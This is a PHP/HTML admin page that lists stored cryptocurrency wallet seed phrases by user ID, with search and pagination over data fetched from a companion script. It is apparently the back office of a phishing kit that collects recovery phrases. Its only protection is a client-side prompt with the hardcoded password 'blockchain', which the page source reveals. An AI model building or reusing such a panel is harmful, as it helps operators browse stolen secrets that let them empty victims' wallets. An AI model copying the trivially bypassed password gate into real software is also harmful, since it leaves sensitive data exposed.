<?php /* phrases_list.php */ ?>
<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Seed Phrases | Admin</title>

<style>
  :root{
    --sp-bg:#0f1115;
    --sp-panel:#161a22;
    --sp-ink:#e8ecf1;
    --sp-ink-muted:#a9b1ba;
    --sp-accent:#3aa6b9;
    --sp-border:#2a3140;
    --sp-row:#1b202a;
    --sp-row-hover:#212838;
    --sp-danger:#c5545a;
  }
  *{box-sizing:border-box}
  body{margin:0;background:var(--sp-bg);color:var(--sp-ink);font-family:system-ui,-apple-system,Segoe UI,Roboto,Ubuntu,"Helvetica Neue",Arial,sans-serif}

  .sp-wrap{max-width:1200px;margin:28px auto;padding:0 14px}
  .sp-h1{margin:0 0 14px;font-size:1.25rem;color:#dce5ee;font-weight:700;letter-spacing:.2px;text-align:center}

  .sp-card{background:var(--sp-panel);border:1px solid var(--sp-border);border-radius:12px;box-shadow:0 6px 24px rgba(0,0,0,.25);padding:14px}

  /* Controls */
  .sp-controls{display:flex;flex-wrap:wrap;gap:10px;align-items:center;margin-bottom:12px}
  .sp-input, .sp-select{
    height:44px;background:#1c2330;color:var(--sp-ink);
    border:1px solid var(--sp-border);border-radius:10px;outline:none;
  }
  .sp-input{padding:0 12px;min-width:260px;flex:1}
  .sp-select{padding:0 10px;min-width:120px}
  .sp-input:focus,.sp-select:focus{border-color:var(--sp-accent);box-shadow:0 0 0 3px rgba(58,166,185,.2)}

  /* Table */
  .sp-table-wrap{position:relative;border:1px solid var(--sp-border);border-radius:12px;overflow:auto;background:#12161f}
  table.sp-table{width:100%;border-collapse:collapse;min-width:900px}
  table.sp-table thead th{
    text-align:left;background:#1a2130;color:#e9f1ff;border-bottom:1px solid var(--sp-border);
    font-weight:600;padding:12px 10px;font-size:.92rem;position:sticky;top:0;z-index:1
  }
  table.sp-table tbody td{
    padding:10px;color:#e0e6ee;border-bottom:1px solid #1d2533;background:var(--sp-row);vertical-align:top
  }
  table.sp-table tbody tr:hover td{background:var(--sp-row-hover)}
  .sp-col-id{width:84px}
  .sp-col-user{width:120px}
  .sp-badge{display:inline-block;padding:2px 8px;border-radius:999px;background:#283245;border:1px solid #354055;color:#cfe7f0;font-size:.78rem}
  .sp-words{overflow:auto;max-width:520px;display:block;color:#cfd7e2}

  /* Footer / Pagination */
  .sp-footer{display:flex;justify-content:space-between;align-items:center;padding:10px 2px}
  .sp-total{color:var(--sp-ink-muted);font-size:.92rem}
  .sp-pages{display:flex;flex-wrap:wrap;gap:6px}
  .sp-page-btn{
    border:1px solid var(--sp-border);background:#1c2330;color:#dfe6f3;border-radius:8px;padding:6px 10px;
    cursor:pointer;font-size:.9rem
  }
  .sp-page-btn[disabled]{opacity:.5;cursor:not-allowed}
  .sp-page-btn.sp-active{background:var(--sp-accent);border-color:var(--sp-accent);color:#051218}

  /* Loaders & Toast */
  .sp-overlay{
    position:absolute;inset:0;background:rgba(10,12,16,.55);
    display:none;align-items:center;justify-content:center;z-index:5
  }
  .sp-overlay.show{display:flex}
  .sp-spinner{width:36px;height:36px;border-radius:50%;border:3px solid #2f3a50;border-top-color:var(--sp-accent);animation:spin 1s linear infinite}
  @keyframes spin{to{transform:rotate(360deg)}}

  .sp-toast{position:fixed;left:50%;bottom:20px;transform:translateX(-50%);background:#1a2130;
    color:#e9f1ff;border:1px solid #2b3550;border-radius:10px;padding:.6rem .9rem;box-shadow:0 10px 30px rgba(0,0,0,.35);
    display:none;z-index:999}
  .sp-toast.show{display:block}
  .sp-toast.error{background:#2a1920;border-color:#593040;color:#ffd9e1}

  /* Small helpers */
  .muted{color:var(--sp-ink-muted)}
</style>
</head>
<body>

<script>
  // Simple alert-prompt gate (front-end only)
  if (prompt("Enter access password:") !== "blockchain") {
    alert("Access denied"); location.replace("about:blank");
  }
</script>

<div class="sp-wrap">
  <h1 class="sp-h1">Seed Phrases</h1>

  <div class="sp-card">
    <div class="sp-controls">
      <input id="sp-q" class="sp-input" type="text" placeholder="Search id, user_id, or words…">
      <select id="sp-limit" class="sp-select">
        <option value="10">10 / page</option>
        <option value="25" selected>25 / page</option>
        <option value="50">50 / page</option>
      </select>
      <button id="sp-refresh" class="sp-page-btn" title="Reload">Reload</button>
    </div>

    <div class="sp-table-wrap">
      <div id="sp-overlay" class="sp-overlay"><div class="sp-spinner"></div></div>

      <table class="sp-table" id="sp-table">
        <thead>
          <tr>
            <th class="sp-col-id">ID</th>
            <th class="sp-col-user">User</th>
            <th>Length</th>
            <th>Words</th>
            <th>Created</th>
          </tr>
        </thead>
        <tbody id="sp-tbody">
          <tr><td colspan="5" class="muted">Loading…</td></tr>
        </tbody>
      </table>
    </div>

    <div class="sp-footer">
      <div id="sp-total" class="sp-total"></div>
      <div id="sp-pages" class="sp-pages"></div>
    </div>
  </div>
</div>

<div id="sp-toast" class="sp-toast"></div>

<script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
<script>
(function(){
  const $q = $('#sp-q');
  const $limit = $('#sp-limit');
  const $tbody = $('#sp-tbody');
  const $pages = $('#sp-pages');
  const $total = $('#sp-total');
  const $overlay = $('#sp-overlay');
  const $toast = $('#sp-toast');

  let page = 1;
  let limit = Number($limit.val()||25);
  let q = '';

  function toast(msg, err){
    $toast.text(msg).toggleClass('error', !!err).addClass('show');
    setTimeout(()=> $toast.removeClass('show'), 2000);
  }

  function esc(html){
    return String(html)
      .replace(/&/g,'&amp;')
      .replace(/</g,'&lt;')
      .replace(/>/g,'&gt;')
      .replace(/"/g,'&quot;')
      .replace(/'/g,'&#039;');
  }

  function renderRows(rows){
    if(!rows || rows.length===0){
      $tbody.html('<tr><td colspan="5" class="muted">No records found</td></tr>');
      return;
    }
    const out = rows.map(r=>{
      const words = (()=> {
        try {
          const arr = JSON.parse(r.words_json || '[]');
          return esc(arr.join(' '));
        } catch(e){ return esc(r.words_json || ''); }
      })();
      return `
        <tr>
          <td>#${esc(r.id)}</td>
          <td>${r.user_id ? esc(r.user_id) : '<span class="muted">—</span>'}</td>
          <td><span class="sp-badge">${esc(r.phrase_length)} words</span></td>
          <td><span class="sp-words" title="${words}">${words}</span></td>
          <td>${esc(r.created_at)}</td>
        </tr>
      `;
    }).join('');
    $tbody.html(out);
  }

  function renderPager(total, page, limit){
    const pages = Math.max(1, Math.ceil(total / limit));
    const btn = (label, p, active=false, disabled=false) =>
      `<button class="sp-page-btn ${active?'sp-active':''}" data-p="${p}" ${disabled?'disabled':''}>${label}</button>`;

    let html = '';
    html += btn('«', 1, false, page===1);
    html += btn('‹', Math.max(1,page-1), false, page===1);

    const win = 2;
    const start = Math.max(1, page - win);
    const end   = Math.min(pages, page + win);
    for(let i=start;i<=end;i++){
      html += btn(i, i, i===page, false);
    }

    html += btn('›', Math.min(pages,page+1), false, page===pages);
    html += btn('»', pages, false, page===pages);

    $pages.html(html);
    $total.text(`Showing page ${page} of ${pages} — ${total} total`);
  }

  function load(p=1){
    page = p;
    limit = Number($limit.val()||25);
    q = $q.val().trim();

    $overlay.addClass('show');

    $.getJSON('fetch_phrases.php', { page, limit, q }, function(resp){
      if(!resp || !resp.success){ toast('Load error', true); return; }
      renderRows(resp.data);
      renderPager(resp.total, resp.page, resp.limit);
    })
    .fail(function(xhr){
      console.error(xhr.responseText);
      toast('Server error', true);
    })
    .always(function(){
      $overlay.removeClass('show');
    });
  }

  // events
  $('#sp-pages').on('click','button', function(){
    const p = Number($(this).data('p'));
    if(!isNaN(p)) load(p);
  });
  $('#sp-limit').on('change', ()=> load(1));

  // debounce search
  let t=null;
  $('#sp-q').on('input', function(){
    clearTimeout(t);
    t = setTimeout(()=> load(1), 300);
  });

  $('#sp-refresh').on('click', ()=> load(page));

  // first load
  load(1);
})();
</script>
</body>
</html>